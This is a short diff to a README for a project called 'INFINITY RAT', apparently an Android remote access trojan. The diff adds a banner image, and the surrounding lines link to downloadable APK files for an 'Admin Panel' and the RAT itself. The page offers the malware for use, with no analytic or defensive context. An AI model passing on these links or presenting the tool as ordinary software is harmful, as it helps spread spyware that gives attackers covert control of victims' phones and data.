@@ -1,4 +1,6 @@
 # INFINITY RAT
+![infinity](https://github.com/infinitynetwork13/INFINITY-RAT/assets/155347164/3d071fda-f2df-4391-bfd8-d6e687ae9fd7)
+
 ## Application
 - 𝙰𝙳𝙼𝙸𝙽 𝙿𝙰𝙽𝙴𝙻[➱](https://github.com/infinitynetwork13/INFINITY-RAT/raw/main/APP/Admin_Panel.apk)
 - 𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝚈 𝚁𝙰𝚃 [➱](https://github.com/infinitynetwork13/INFINITY-RAT/raw/main/APP/INFINITY_RAT.apk)
